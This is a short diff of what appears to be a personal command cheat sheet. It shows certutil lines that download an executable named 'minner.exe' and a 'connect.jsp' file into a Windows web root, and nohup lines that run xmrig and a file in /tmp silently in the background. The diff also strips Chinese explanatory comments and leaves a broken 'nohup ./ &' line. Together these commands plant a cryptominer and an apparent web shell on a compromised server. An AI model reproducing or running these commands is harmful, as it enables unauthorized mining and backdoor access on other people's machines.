@@ -15,11 +15,8 @@ certutil -urlcache -split -f https://github.com/Pamentierx/xmr/raw/main/minner.e
 
 certutil -urlcache -split -f https://raw.githubusercontent.com/Pamentierx/xmr/main/connect.jsp x:\webapps\root\connect.jsp
 
-后台运行的命令
+nohup ./ &
 
-nohup ./程序名 &
-
-不输出错误信息
 
 nohup ./tmp/.xmr/xmrig >/dev/null 2>&1 &
 nohup /tmp/zayting >/dev/null 2>&1 &
